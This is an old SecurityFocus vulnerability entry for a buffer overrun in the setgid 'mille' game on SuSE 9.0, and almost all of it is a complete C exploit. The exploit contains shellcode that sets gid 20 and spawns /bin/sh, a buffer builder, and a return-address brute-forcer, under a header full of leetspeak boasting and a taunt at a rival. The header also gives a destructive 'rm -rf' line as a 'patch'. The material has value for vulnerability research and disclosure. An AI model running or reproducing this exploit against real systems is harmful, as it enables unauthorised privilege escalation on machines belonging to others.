source: http://www.securityfocus.com/bid/10165/info

bsd-games mille is prone to a locally exploitable buffer overrun vulnerability. This issue is due to insufficient bounds checking when the user inputs a file name when saving a game. 

This game is typically installed setgid games so may allow privileges to be escalated to this level if exploited.

/* Suse 9.0 /usr/games/mille local gid=20(games) Xpl0i7

4u7h0r: N4rK07IX   narkotix@linuxmail.org

Scrip7kiddi3Z k33p y0ur h4ndz 4w4y , 7hiz n0t r00t spl0i7.
Bug: 0v3rfl0w wh3n s4ving th3 g4m3.
F0und by : N4rK07iX  , th4nx to 0x7bf2 f0r his gr34t Suse B0X.
3xpl0i747i0n : mill3 iz fil73ring s0m3 ch4r4c73rz lik3 '0x90' '\220' 4nd m0r3.
               s0 us3 y0ur sm4r7 sh3llc0d3 , XOR 7h4t ch4rz. 
Quick P47ch : rm -rf /usr/games/mille

Gr33tZ: 0x7bf2,mathmonkey,Efnet, Blackhat Community,d4mn3d,susp3ct3dguy,xoredman,gotcha,forkbomb

L4st W0rdz: Bigmu74n7 sen cok asagilik bi insansin dostum, dedigini kabul ediyorum, anlasmamiz vardi;
            ama sen onunda ustesinden gelemedin,3. ye ne dersin? Evet Evet kabul ediyorsun biliyorum,
	    ne de olsa 31337 codersin !!!. Exploit kullanmadan Max 45 saniyede Nt deyim biliyorsun!!!(uzulme gececektir!)
	    5Mb hattim olmasa da  1700 cisco firewall nasil bypass edilir o zaman goreceksin....Senin kadar zengin
	    olmayabilirim fakat bizim delikanli gibi yuregimiz var. Bize yakismaz, senin gibi console-kiddy
	    bu ulkede yeterince var.. Yerinde olsam o worm un uzerinde biraz daha calisirdim, 2 aya kalmaz bitiyordu,
	    ne oldu yoksa fazla besleyemedin mi solucani,,, Sana ne kadar soylesem az dostum...Bu ulkeyi senin gibi Allah'siz
	    kitapsizlara birakmicaz bunu da bil. ITU de hidroligin orda yine bekliorum, taki senin yenilgiye doydugun ana kadar...
	    
	    EFSANELER HIC BIR ZAMAN OLMEZLER !!!! Thanx.
	    
	   
	    



*/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/types.h>
#include <errno.h>
#define BUFFERSIZE 112
#define PATH "/usr/games/mille"
#define PROG "mille"
#define ENTER "\n" 
#define NOP  0x90 // <--- mille iz filt3ring 0u7 NOP. Prin7ing '~P'
#define DEC 40
#define BRUTE_START 0xbffffff4
unsigned long getesp()
{
        __asm__("movl %esp, %eax");
}

    char shellcode[]= // Put h3r3 y0ur sm4r7 sh3llc0d3
/* setregid (20,20) */
    "\x31\xc0\x31\xdb\x31\xc9\xb3\x14\xb1\x14\xb0\x47"
    "\xcd\x80"

    /* exec /bin/sh */
    "\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
    "\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";

char  buffer[BUFFERSIZE];
char *pointer;
 

void vuln_start()
{
static FILE *lamemille;
static char *fireupmille = "/usr/games/mille";
static char savefile[]="s";
char *filename = buffer;

lamemille = popen(fireupmille,"rw");
fprintf(lamemille,"%s",savefile);
fflush(lamemille);

fprintf(lamemille,"%s",filename);
fflush(lamemille);

fprintf(lamemille,"%s",ENTER);
fflush(lamemille);
pclose(lamemille);
}


int child_process()
{
int i;
int status;
pid_t pid;
pid_t waitpid;
pid = fork();
  if(pid == -1)
    { fprintf(stderr,"[-]%s. Fork Failed!\n",strerror(errno) );
      exit(127);
    }
  else if (pid == 0)
    { vuln_start();
      
    }
      else {
       waitpid = wait(&status);
          if(waitpid == -1)
	   { fprintf(stderr,"[-] %s. Wait Failed! \n",strerror(errno));
	     exit(1);
	   }
	   else if(waitpid != pid)
	   abort();
	   else 
             {
	       if(WIFEXITED(status))
	          { printf("Child Terminated Normally. Exit Code = %d\n",WEXITSTATUS(status));
		    return WEXITSTATUS(status);
		  }
	       else if(WIFSIGNALED(status))
	          { printf("Child Terminated Abnormally. Exit Code = %d.(%s)\n",WTERMSIG(status),strsignal(WTERMSIG(status)));
		    return WTERMSIG(status);
	              if( COREDUMP(status) )
		        { printf(" Core Dumped,Core File Generated\n");
			}  
                  }
	       else{ fprintf(stderr,"[-] Child Stopped\n");
	            }
             }   
          }
	  
     return 1;
 }
int make_buffer(unsigned long ret)
{
/*buffer = (char *)malloc(BUFFERSIZE*sizeof(char));
if(!buffer)
  {
   fprintf(stderr,"malloc() failed. ");
   exit(-1);
   }
*/    
   char l =  (ret & 0x000000ff);
   char a =  (ret & 0x0000ff00) >> 8;
   char m =  (ret & 0x00ff0000) >> 16;
   char e =  (ret & 0xff000000) >> 24;

memset(buffer,NOP,BUFFERSIZE);
memcpy(&buffer[BUFFERSIZE-4-strlen(shellcode)],shellcode,strlen(shellcode));

buffer[108] = l;
buffer[109] = a;
buffer[110] = m;
buffer[111] = e;

return(0);
}

int bruteforce(unsigned long firstret)
{
int found;
long i;
unsigned long ret;
fprintf(stdout,"[+] Bruteforce Starting!!!\n");
fprintf(stdout,"firstret = %lu\n",firstret);
for(i = firstret ; i<0 ; i+=DEC)
     {
     fprintf(stdout,"[+] Testing Ret Address 0x%x\n",i);
     make_buffer(i);
     found = child_process();
      if(found == 0)
        { printf("Ret Adress Found = 0x%x\n",i);
	  break;
	}
    }
   return(0);
 }   

void banner(char *argv0)
{
fprintf(stderr,"---------------------------------------\n");
fprintf(stderr,"Suse 9.0 /usr/games/mille local Exploit\n");
fprintf(stderr,"4uth0r: N4rK07IX\n");
fprintf(stderr,"=> narkotix@linuxmail.org\n");
fprintf(stderr,"Brute Force: %s -b\n",argv0);
fprintf(stderr,"Manuel Ret:  %s -a ret\n",argv0);
fprintf(stderr,"---------------------------------------\n");
              
     
     
 }
 main(int argc, char *argv[])
 {
  char *optionlist = "ba:h:";
  int option;
  unsigned long start = BRUTE_START;
  unsigned long  choose;
  int u_r_script_kiddy = 0;
  int Opterr = 1;
  banner(argv[0]);
  if(argc < 2)
  fprintf(stderr,"Use -h for help\n");
  while( (option = getopt(argc,argv,optionlist) ) != -1)
       switch(option)
        { 
	  case 'b':
	   u_r_script_kiddy=1;
	   break;
	  
	  case 'h':
	   banner(argv[0]);
	   break; 
	   
	  case 'a':
           choose = strtoul(optarg,NULL,0);
           make_buffer(choose);
           child_process();
           exit(0);
           break;
	  
	  case '?':
	   fprintf(stderr,"Unknown Option \n");
	   banner(argv[0]);
	   exit(-1);
	   
	  default:
	   banner(argv[0]);
	   exit(-1);
	}
   if(u_r_script_kiddy)
     bruteforce(start);
      return 0;
}